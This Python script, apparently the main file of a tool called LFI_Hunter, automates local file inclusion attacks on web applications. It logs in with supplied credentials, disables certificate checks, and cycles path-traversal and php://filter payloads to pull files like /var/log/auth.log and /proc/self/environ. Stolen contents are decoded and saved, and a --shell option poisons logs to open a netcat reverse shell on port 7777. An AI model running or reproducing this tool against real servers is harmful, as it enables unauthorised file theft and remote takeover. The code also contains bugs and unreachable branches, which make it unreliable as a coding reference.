#!/usr/bin/env python
import urllib.response
import time
import sys
import argparse
import mechanize
import ssl
import urllib
import re
import os
import subprocess
ssl._create_default_https_context = ssl._create_unverified_context  
path = ('file://'+os.getcwd()+'/FileStore/')

class Read_File:
   try:
     def __init__(self):
            self.control()
            if self.args.read:
                  try:   
                      with open(self.args.Cookie,'r') as Cookie_file :
                          self.Cookie =  Cookie_file.read()
                  except Exception as e :
                     print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
                     print("[*] Error : ",e )
                     print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
                     print("[*] Chech the File Name or File Path  to your Cookies File")
                     exit()   
            print('\n'+'='*20+"\n[*] Input-INFO "+'\n'+'='*30+'\n')
            if self.args.auth:
               print("[+] Mothead             : ................ | : Full authentication")    
               try:
                  print("[+] Login url           : ................ | : "+self.args.loginurl)
                  print("[+] username            : ................ | : "+self.args.user)
                  print("[+] Login password      : ................ | : "+self.args.password)
               except Exception as e:
                  print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
                  print("[*] Error : ",e )
                  print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
                  print("[*] Chech login info UserName and Password ")
                  print("[*] Should use --loginurl <url> --username <username> --password <password>")
                  print("[*] Should username and Password is True")
                  print("[*] Example : --url lodinurl http://10.10.10.44/login.php --user admin --password admim")
                  print("[*] ckeck Readme file at : https://www.github/jac11/LFI_Hunter.git")
                  exit()                          
            if self.args.filelist:
                print("[+] LFI-wordlist        : ................ | : "+self.args.filelist)
            else:
                print("[+] LFI-wordlist        : ................ | : LFI-wordlist.txt")  
            print("[+] Vulnrenable url     : ................ | : "+self.args.Vulnurl)
            if self.args.base64:
               print("[+] PHP-Filter          : ................ | : Convert-base64") 
            print("[+] web Cookies         : ................ | : "+self.Cookie)  
            if self.args.auth and self.args.Vulnurl\
            and self.args.password and self.args.user\
            and self.args.Cookie and self.args.loginurl\
            and self.args.read:
                self.Login_auth()
                self.url_request()
            elif not self.args.auth and self.args.Vulnurl\
            and not self.args.password and not self.args.user and self.args.Cookie\
            and self.args.read :
                self.url_request()
            else:
                print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
                print("[*] Error :  Bad argument Logic command  Error" )
                print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
                print('[+] To use LFI with login     : --auth --loginurl --Vulnurl --user --password --filelist --Cookie ') 
                print('[+] To use LFI without  login : --Vulnurl --filelist --Cookie') 
                print("[*] ckeck Readme file at      : https://www.github/jac11/LFI_Hunter.git")
                exit()            
     def Login_auth(self):
               loginurl = self.args.loginurl
               request = mechanize.Browser()
               request.set_handle_robots(False)
               request.set_handle_redirect(True)
               request.set_handle_refresh(True, max_time=1)
               request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
                                 ('Cookie',str(self.Cookie).replace('\n','')),]
               try:                  
                  url_login = request.open(loginurl)
               except urllib.error.URLError as e :
                   print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
                   print("[*] Error : ",e )
                   print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
                   print("[*] Follow url Format ")
                   print("[*] url Format : http/https://<ip>:<port>/<dir>")  
                   print("[*] Example : http://10.10.10.193:4000/page=index.php")
                   exit()          
               try: 
                  request.select_form(nr = 0)
               except Exception :
                  try:
                    request.select_form(nr = 1)                 
                  except Exception:
                     try:
                       request.select_form(nr = 2)
                     except Exception:      
                        try:
                           request.select_form(nr = 3)
                        except Exception:
                             try:
                                request.select_form(nr = 4)                        
                             except Exception as e:
                                  print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
                                  print("[*] Error : ",e )
                                  print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
                                  print("[*] try to use with out login Mothead") 
                                  print('[+] To use LFI without  login : --Vulnurl --filelist --Cookie') 
                                  exit()                 
               if  self.args.user and self.args.password and not self.args.PassForm and  not self.args.UserForm  :
                   request["username"] = f'{self.args.user}'
                   request["password"] = f'{self.args.password}' 
               elif self.args.user and  self.args.password and not self.args.PassForm and  self.args.UserForm:
                   request[f'{self.args.UserForm}'] = f'{self.args.user}'
                   request["password"] = f'{self.args.password}'
               elif self.args.user and self.args.password and self.args.PassForm and not self.args.UserForm :
                   request["username"] = '{self.args.user}'
                   request[f'{self.args.PassForm}']=f'{self.args.password}' 
               elif self.args.user and self.args.password and  self.args.PassForm and  self.args.UserForm :
                   request[f'{self.args.UserForm}'] = f'{self.args.user}'
                   request[f'{self.args.PassForm}']=f'{self.args.password}' 
               response   = request.submit()         
               self.info  = response.info()
               content    = response.read()  
               self.url   = response.geturl()   
                  
     def url_request(self):  
        try: 
           self.ip_re = re.search('(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|\
                      [1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\\b\\b',self.args.Vulnurl)#).strip()
           if not os.path.exists('./FileStore/'+self.ip_re.group()+"/"):
                  os.makedirs('./FileStore/'+self.ip_re.group()+"/") 
           if self.args.auth:
               self.Login_auth()  
                        
           with open('./Package/LFT_one.txt','r') as readline :
                command_dir = readline.readlines()
                for LINE in command_dir :
                    LINE.replace('\n','')
                    self.LFi = ''
                    if self.args.base64:
                        phpfillter = 'php://filter/read=convert.base64-encode/resource='
                        URL = self.args.Vulnurl+ phpfillter

                    else:
                         URL = self.args.Vulnurl 
                    if '//' in LINE and not 'file' in LINE:  
                        self.LFI =URL+LINE+self.args.read.replace('/','//')
                    elif '%2f' in LINE  :
                          self.LFI = URL+LINE+self.args.read.replace('/','%2f')
                    elif 'file:' in LINE :
                         self.LFI = URL+LINE+self.args.read.replace('/','',1)       
                    else:
                        self.LFI = URL+LINE+self.args.read                                                                                               
                    self.url = self.LFI
                    request = mechanize.Browser()
                    request.set_handle_robots(False)
                    request.set_handle_redirect(True)
                    request.set_handle_refresh(True, max_time=1)              
                    request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1)\
                                 Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
                                 ('Cookie',str(self.Cookie).replace('\n','')),
                                 ('username',"admin'#"),
                                 ('password','password')]
                    try:             
                       first_req = request.open(self.args.Vulnurl).read()                                                      
                       self.Get_Oregnal_URL = request.open(self.url).read() 
                    except Exception  as e :
                         print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
                         print("[*] Error : ",e )
                         print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
                         print("[*] Follow url Format ")
                         print("[*] url Format : http/https://<ip>:<port>/<dir>")  
                         print("[*] Example : http://10.10.10.193:4000/page=index.php")
                         exit()   
                    except KeyboardInterrupt:
                         exit()           
                 
                    if self.args.auth and len(self.Get_Oregnal_URL) != len(first_req) :                  
                        pythex = str(re.findall('Content-Length:.+',str(self.info)))
                        pythex= pythex.replace("['",'').replace("']",'')
                        if pythex in str(self.info):
                           info = str(self.info).replace(pythex,'Content-Length:'+str(len(self.Get_Oregnal_URL)))
                           rex2 = re.findall(':.+',info)
                           print('='*20+"\n[*] Web-Info "+'\n'+'='*30+'\n')
                           print("[+] Date                : ................ | "+rex2[0])
                           print("[+] Server              : ................ | "+rex2[1])
                           print("[+] Expires             : ................ | "+rex2[2])
                           print("[+] Cache-Control       : ................ | "+rex2[3])
                           print("[+] Pragma              : ................ | "+rex2[4])
                           print("[+] Vary                : ................ | "+rex2[5])
                           print("[+] Content-Length      : ................ | "+str(rex2[6]).replace(':',': '))
                           print("[+] Connection          : ................ | "+rex2[7])
                           print("[+] Content-Type        : ................ | "+rex2[8]+'\n')
                           print('\n'+'='*20+"\n[*] Vulnerable Found  "+'\n'+'='*30+'\n')
                           print("[+] Vulnerable  Link    : ................ | : "+self.url.replace('\n',''))                           
                           self.store_file()                           
                           print('\n'+'='*20+"\n[*] Directory Traversal "+'\n'+'='*30+'\n')
                           print("[+] File request        : ................ | : "+self.args.read.replace('\n','')) 
                           print("[+] Full Path           : ................ | : "+self.LFI.replace('\n',''))
                           print("[+] File Name           : ................ | : "+self.args.read.replace('/','',1).replace('/','_'))
                           if '/' in self.args.read:
                               print("[+] save Locatoin       : ................ | : "+path+self.ip_re.group()+"/"\
                               +self.args.read.replace('/','',1).replace('/','_'))  
                           else:
                               print("[+] save Locatoin       : ................ | : "+path+self.ip_re.group()+"/"\
                               +self.args.read.replace(self.args.read[0],'_'+self.args.read[0]).replace('/','_'))
                           if self.args.shell:
                                if  "auth" in  self.url or "auth.log" in  self.url\
                                or "environ" in self.url: 
                                    print('\n'+'='*20+"\n[*] Shell-Info "+'\n'+'='*30+'\n')
                                    time.sleep(1)
                                    print("[+] Attack type          : ................ | : Reverse-Shell") 
                                    print("[+] Mothead              : ................ | : enjaction log file  ")
                                    print("[+] Lisliner Tool        : ................ | : NETCAT ")
                                    print("[+] Lisliner IP          : ................ | :",self.ip_re.group())   
                                    print("[+] Lisliner Port        : ................ | : 7777") 
                                    self.Reverse_shell()
                                    exit()
                                else:
                                      print('\n'+'='*20+"\n[*] Shell-Info "+'\n'+'='*30+'\n')
                                      time.sleep(1)
                                      print("[*] FILE : ", self.args.read)
                                      time.sleep(1)
                                      print("[*] INFO :  Cat not add PHP Code To",self.args.read)
                                      time.sleep(1)
                                      print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
                                      print("[*] To Get Shell try  --read  with 'environ/auth' log file ")  
                                      print("[*] Example : --read /var/log/auth.log ")
                                      print("[*] Example : --read /proc/self/environ")
                                      print("[*] Example : --read /var/log/auth")
                                      exit()            
                           else:
                                exit()   
                    elif not self.args.auth and len(self.Get_Oregnal_URL) != len(first_req):
                           self.store_file() 
                           print('\n'+'='*20+"\n[*] Vulnerable Found  "+'\n'+'='*30+'\n')
                           print("[+] Vulnerable  Link    : ................ | : "+self.url.replace('\n','')) 
                           print('\n'+'='*20+"\n[*] Directory Traversal "+'\n'+'='*30+'\n')
                           print("[+] File request        : ................ | : "+self.args.read.replace('\n','')) 
                           print("[+] Full  URL           : ................ | : "+ self.LFI.replace('\n',''))
                           print("[+] File Name           : ................ | : "+self.args.read.replace('/','',1).replace('/','_'))
                         
                           if '/' in self.args.read:
                               print("[+] save Locatoin       : ................ | : "+path+self.ip_re.group()+"/"\
                               +self.args.read.replace('/','',1).replace('/','_'))  
                           else:
                               print("[+] save Locatoin       : ................ | : "+path+self.ip_re.group()+"/"\
                               +self.args.read.replace(self.args.read[0],'_'+self.args.read[0]).replace('/','_'))              
                           if self.args.shell:
                                if  "auth" in  self.url or "auth.log" in  self.url\
                                or "environ" in self.url: 
                                    print('\n'+'='*20+"\n[*] Shell-Info "+'\n'+'='*30+'\n')
                                    time.sleep(1)
                                    print("[+] Attack type          : ................ | : Reverse-Shell") 
                                    print("[+] Mothead              : ................ | : enjaction log file  ")
                                    print("[+] Lisliner Tool        : ................ | : NETCAT ")
                                    print("[+] Lisliner IP          : ................ | :",self.ip_re.group())   
                                    print("[+] Lisliner Port        : ................ | : 7777") 
                                    self.Reverse_shell()
                                    exit()
                                else:
                                      print('\n'+'='*20+"\n[*] Shell-Info "+'\n'+'='*30+'\n')
                                      time.sleep(1)
                                      print("[*] FILE : ", self.args.read)
                                      time.sleep(1)
                                      print("[*] INFO :  Cat not add PHP Code To",self.args.read)
                                      time.sleep(1)
                                      print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
                                      print("[*] To Get Shell try  --read  with 'environ/auth' log file ")  
                                      print("[*] Example : --read /var/log/auth.log ")
                                      print("[*] Example : --read /proc/self/environ")
                                      print("[*] Example : --read /var/log/auth")
                                      exit()            
                           else:
                                exit()   
                print('\n'+'='*20+"\n[*] RESUITE-INFO "+'\n'+'='*30+'\n')
                print("[*] No Data found")
                print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
                print("[*] try to use new cookie ")
                print("[*] try to use aggressive mode ")                
                if not self.args.base64:
                   print("[*] try to use PHP Filter by useing -B64/--base64 ")  
                print("[*] check Readme file at : https://www.github/jac11/LFI_Hunter.git")   
                exit()                       
        except SyntaxError as a :
               print(a)
               exit()                                                                                    
     def control(self): 
           parser = argparse.ArgumentParser(description="Usage: [OPtion] [arguments] [ -w ] [arguments]") 
           parser.add_argument("-UV ","--Vulnurl"     , action=None         ,required=True     ,help ="url Targst web") 
           parser.add_argument("--auth"               , action='store_true'                    ,help ="url Targst web") 
           parser.add_argument("-F","--filelist"      , action=None            ,help ="read fron self.LFI wordlsit ")
           parser.add_argument("-C","--Cookie"        , action=None                            ,help ="Login sesion Cookie")  
           parser.add_argument("-B64","--base64"      , action='store_true'                    ,help ="Login sesion base64")  
           parser.add_argument("-R","--read"          , action=None                            ,help ="Login sesion base64")  
           parser.add_argument("-UF ","--UserForm"    , action=None                            ,help =" add name of the HTML Form Login User")
           parser.add_argument("-PF ","--PassForm"    , action=None                            ,help ="add name of the HTML Form Login Passord")
           parser.add_argument("-P  ","--password"    , action=None                            ,help ="use specific Passowrd")   
           parser.add_argument("-LU  ","--loginurl"   , action=None                            ,help ="use specific Passowrd") 
           parser.add_argument("-U  ","--user"        , action=None                            ,help ="use specific username ")
           parser.add_argument( "-S", "--shell"       , action=None                            )
           self.args = parser.parse_args()     
           if len(sys.argv)!=1 :
              pass
           else:
              parser.print_help()         
              exit()                   
     def store_file(self): 
         if  os.path.exists('./FileStore/'+self.ip_re.group()+'/'+self.args.read.replace(self.args.read[0],'_'+self.args.read[0])):  
             os.remove('./FileStore/'+self.ip_re.group()+'/'+self.args.read.replace(self.args.read[0],'_'+self.args.read[0]))
         if  os.path.exists('./FileStore/'+self.ip_re.group()+'/'+self.args.read.replace('/','',1).replace('/','_')):  
             os.remove('./FileStore/'+self.ip_re.group()+'/'+self.args.read.replace('/','',1).replace('/','_')) 
        
         with open('./FileStore/'+self.ip_re.group()+'/index.txt','w') as html:
            html.write(str(self.Get_Oregnal_URL).replace("b'",''))  
         with open ('./FileStore/'+self.ip_re.group()+'/index.txt','r') as read :
            read = read.read()
            if self.args.base64 and '<html>' in read[0:8] :
                 with open ('./FileStore/'+self.ip_re.group()+'/index.txt','r') as f :
                      line = f.read()
                      line = line.split("\\n")
                      for i in line :                                            
                          with open('./FileStore/'+self.ip_re.group()+"/"+self.args.read.replace('/','',1).replace('/','X'),'a') as b :                                      
                              b.write(i+'\n')                              
                 with open('./FileStore/'+self.ip_re.group()+"/"+self.args.read.replace('/','',1).replace('/','X'),'r')as file1:
                      readf = file1.readlines()                                             
                      for h in readf :                                   
                          if '<' in h:                              
                              h1 = h.replace(h,'')
                          else:
                               with open('./FileStore/'+self.ip_re.group()+"/"+self.args.read.replace('/','',1).replace('/','__'),'a') as file2:
                                     base64 = file2.write(h) 
                               with open('./FileStore/'+self.ip_re.group()+"/"+self.args.read.replace('/','',1).replace('/','__'),'r') as file2: 
                               
                                    read_data = file2.read().replace('\\n','').replace('\\t','').replace('\\r','')
                                    import base64   
                                    read_data= bytes(read_data.encode())                 
                                    decoded64 = str(base64.b64decode(read_data.decode()))
                                    read_data = decoded64.split("\\n") 
                                    for line in read_data : 
                                          if '/'not in self.args.read:
                                              with open('./FileStore/'+self.ip_re.group()+"/"+self.args.read.replace(self.args.read[0],'_'\
                                              +self.args.read[0]),'a') as File_2: 
                                                     data_Finsh = File_2.write(line.replace("b'",'').replace("'",'')+'\n')                        
                                          else:                            
                                               with open('./FileStore/'+self.ip_re.group()+"/"+self.args.read.replace('/','',1).replace('/','_'),'a') as File_2:
                                                    data_Finsh = File_2.write(line.replace("b'",'').replace("'",'')+'\n')                        
                                    with open('./FileStore/'+self.ip_re.group()+"/"+self.args.read.replace('/','',1).replace('/','_'),'r') as File_2 :
                                          check_id = File_2.read()
                                          if '\\x' in check_id :
                                             with open('./FileStore/'+self.ip_re.group()+"/"+self.args.read.replace('/','',1).replace('/','__'),'r') as file2: 
                                                       read_data = file2.read().replace('\\n','').replace('\\t','').replace('\\r','') 
                                                       
                                             with open('./FileStore/'+self.ip_re.group()+"/"+self.args.read.replace('/','',1).replace('/','_'),'w') as File_2 :  
                                                        File_2.write( read_data)
                                          else:
                                              pass              
                                                       
                 if os.path.exists('./FileStore/'+self.ip_re.group()+'/index.txt'):
                    os.remove('./FileStore/'+self.ip_re.group()+'/index.txt')  
                    os.remove('./FileStore/'+self.ip_re.group()+"/"+self.args.read.replace('/','',1).replace('/','X'))
                    os.remove( './FileStore/'+self.ip_re.group()+"/"+self.args.read.replace('/','',1).replace('/','__'))
      
            elif self.args.base64 and '<html>' not in read[0:8] :       
                   with open ('./FileStore/'+self.ip_re.group()+'/index.txt','r') as read :             
                        read_out =  read.read().split('<',1)
                        for line0 in read_out:
                            if '<' in line0:
                                line1=line0.replace(line0,'')                                                                     
                            else:
                            
                                with open('./FileStore/'+self.ip_re.group()+"/"+self.args.read.replace('/','',1).replace('/','X'),'a') as File_0:  
                                     File_0.write(line0) 
                                exit()     
                                with open('./FileStore/'+self.ip_re.group()+"/"+self.args.read.replace('/','',1).replace('/','X'),'r') as File_1:  
                                     read_data = File_1.read().replace('\\n','').replace('\\t','').replace('\\r','')
                                import base64   
                                read_data= bytes(read_data.encode())                                                        
                                decoded64 = str(base64.b64decode(read_data.decode()))
                                read_data = decoded64.split("\\n") 
                                for line in read_data :  
                                    if '/'not in self.args.read:
                                         with open('./FileStore/'+self.ip_re.group()+"/"+self.args.read.replace(self.args.read[0],'_'+self.args.read[0]),'a') as File_2:
                                               data_Finsh = File_2.write(line.replace("b'",'').replace("'",'')+'\n') 
                                              
                                    else:                      
                                         with open('./FileStore/'+self.ip_re.group()+"/"+self.args.read.replace('/','',1).replace('/','_'),'a') as File_2:
                                              data_Finsh = File_2.write(line.replace("b'",'').replace("'",'')+'\n')                        
                   if os.path.exists('./FileStore/'+self.ip_re.group()+'/index.txt'):
                      os.remove('./FileStore/'+self.ip_re.group()+'/index.txt')  
                      os.remove('./FileStore/'+self.ip_re.group()+"/"+self.args.read.replace('/','',1).replace('/','X'))             
            elif not self.args.base64 and '<html>' in read[0:8] :
                 with open ('./FileStore/'+self.ip_re.group()+'/index.txt','r') as f :
                      line = f.read()
                      line = line.split("\\n")
                      for i in line :                                            
                          with open('./FileStore/'+self.ip_re.group()+"/"+self.args.read.replace('/','',1).replace('/','X'),'a') as b :                                      
                              b.write(i+'\n')                              
                 with open('./FileStore/'+self.ip_re.group()+"/"+self.args.read.replace('/','',1).replace('/','X'),'r')as file1:
                      readf = file1.readlines()                                             
                      for h in readf :                                   
                          if '<' in h:                              
                              h1 = h.replace(h,'')
                          else:
                               if '/'not in self.args.read:
                                   with open('./FileStore/'+self.ip_re.group()+"/"+self.args.read.replace(self.args.read[0],'_'+self.args.read[0]),'a') as File_2:
                                         data_Finsh = file2.write(h)
                               else:          
                                    with open('./FileStore/'+self.ip_re.group()+"/"+self.args.read.replace('/','',1).replace('/','_'),'a') as file2:
                                         file2.write(h) 
                                    
                 if os.path.exists('./FileStore/'+self.ip_re.group()+'/index.txt'):
                    os.remove('./FileStore/'+self.ip_re.group()+'/index.txt')  
                    os.remove('./FileStore/'+self.ip_re.group()+"/"+self.args.read.replace('/','',1).replace('/','X'))
            elif not self.args.base64 and '<html>' not in read[0:8] :   
                with open ('./FileStore/'+self.ip_re.group()+'/index.txt','r') as read:       
                     read_out =  read.read().split('<',1)
                for line in read_out:
                    if '<' in line:
                       line1=line.replace(line,'')  
                    else:
                        with open('./FileStore/'+self.ip_re.group()+"/"+self.args.read.replace('/','',1).replace('/','X'),'a') as File_1:  
                             File_1.write(line) 
                        with open('./FileStore/'+self.ip_re.group()+"/"+self.args.read.replace('/','',1).replace('/','X'),'r') as File_1:  
                             read_data = File_1.read().split("\\n") 
                             for line in read_data : 
                                  if '/'not in self.args.read:
                                     with open('./FileStore/'+self.ip_re.group()+"/"+self.args.read.replace(self.args.read[0],'_'+self.args.read[0]),'a') as File_2:
                                         data_Finsh = File_2.write(line+'\n')
                                  else:                                                 
                                      with open('./FileStore/'+self.ip_re.group()+"/"+self.args.read.replace('/','',1).replace('/','_'),'a') as File_2:
                                           data_Finsh = File_2.write(line+'\n')
                if os.path.exists('./FileStore/'+self.ip_re.group()+'/index.txt'):
                   os.remove('./FileStore/'+self.ip_re.group()+'/index.txt')  
                   os.remove('./FileStore/'+self.ip_re.group()+"/"+self.args.read.replace('/','',1).replace('/','X'))
     def Reverse_shell(self):
                 if not self.args.shell:
                    exit()
                 else:   
                   try:
                     from Package.LFT_Shell_connect import Shell_conncet
                     Shell_conncet.__init__(self)                     
                   except KeyboardInterrupt :
                      exit()
     def file_name (self):
           removel  = ['..%2F','../','....//','file:///']
           self.url_remove = self.url.replace('http://','').replace('https://','')
           for i in removel :
                 if i in self.url_remove :
                    join = ";".join(self.url_remove.split(i[-1]))
                    split_list = join.split(';')
                    self.args.read= str("/".join((split_list[-3],split_list[-2],split_list[-1]))).replace('%2','/').replace('//','/').replace('\n','') 
                          
   except Exception  as a :
        print(a)                                       
if __name__=='__main__':
   Read_File()    
